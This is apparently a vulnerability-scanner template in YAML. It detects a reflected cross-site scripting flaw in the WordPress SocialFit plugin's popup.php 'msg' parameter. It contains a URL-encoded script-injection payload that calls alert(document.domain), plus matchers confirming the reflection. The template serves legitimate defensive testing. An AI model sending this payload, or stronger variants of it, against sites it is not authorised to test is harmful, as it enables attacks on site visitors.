id: "wp-socialfit-xss"
name: "WordPress SocialFit - Cross-Site Scripting"
severity: "high"
description: "WordPress SocialFit is vulnerable to a cross-site scripting vulnerability via the 'msg' parameter because it fails to properly sanitize user-supplied input."
tech:
  - "wordpress"
  - "php"
tags:
  - "wordpress"
  - "wp"
  - "xss"
  - "wp-plugin"
  - "edb"
  - "vuln"
cwe: "CWE-79"
reference: "https://www.exploit-db.com/exploits/37481"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "</script><script>alert(document.domain)</script>"
  - type: "word"
    part: "body"
    words:
      - "<title>Google+"
      - "window.___gcfg"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
